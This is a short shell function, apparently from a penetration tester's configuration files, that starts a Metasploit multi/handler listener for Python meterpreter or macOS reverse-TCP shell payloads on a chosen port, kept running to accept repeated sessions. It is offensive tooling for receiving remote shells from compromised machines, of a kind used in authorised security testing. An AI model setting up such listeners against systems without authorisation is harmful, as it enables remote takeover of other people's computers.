# MSF
# ===

msflisten() {
    if [[ $# -eq 0 ]] ; then
        echo "usage: msflisten <type> <port>"
        echo ""
    else
        local TYPE="$1"
        local LPORT="$2"

        case $TYPE in
            py)
                PAYLOAD="python/meterpreter/reverse_tcp" ;;

            osx)
                PAYLOAD="osx/x64/shell_reverse_tcp" ;;

            *)
                echo "Incorrect Payload Type"
                return;;
        esac

        if [ -z "$LPORT" ] ; then
            echo "No port given"
        else
            ./msfconsole -x "use multi/handler; set PAYLOAD $PAYLOAD; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j"
        fi
    fi
}

